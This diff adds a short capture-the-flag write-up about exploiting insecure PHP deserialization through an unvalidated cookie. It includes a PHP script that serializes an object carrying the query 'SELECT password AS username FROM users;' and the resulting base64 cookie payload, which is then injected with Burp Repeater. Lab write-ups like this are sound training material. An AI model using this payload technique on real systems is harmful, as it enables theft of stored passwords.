@@ -1,0 +1,26 @@
+Wrote a php script to generate serialized object payload, this will help get the flag as the application currently does not validate the cookie value.
+I wrote the script in php with vim and was able to reproduce a cookie value and injected it using the burp suite repeater tool. 
+
+<?php 
+
+class SQL
+{
+	public $query;
+	public $conn;
+
+	function __construct()
+	{	
+		$this->query = 'SELECT password AS username FROM users;';
+		$this->conn = NULL;
+	}
+}
+
+$sql = new SQL();
+
+$obj = serialize($sql);
+
+echo $obj . "\n";
+echo base64_encode($obj) . "\n";
+
+the cookie value was returned as TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6Mzk6IlNFTEVDVCBwYXNzd29yZCBBUyB1c2VybmFtZSBGUk9NIHVzZXJzOyI7czo0OiJjb25uIjtOO30=
+and this cookie was injected in the repeater tool in the request and the flag was discovered
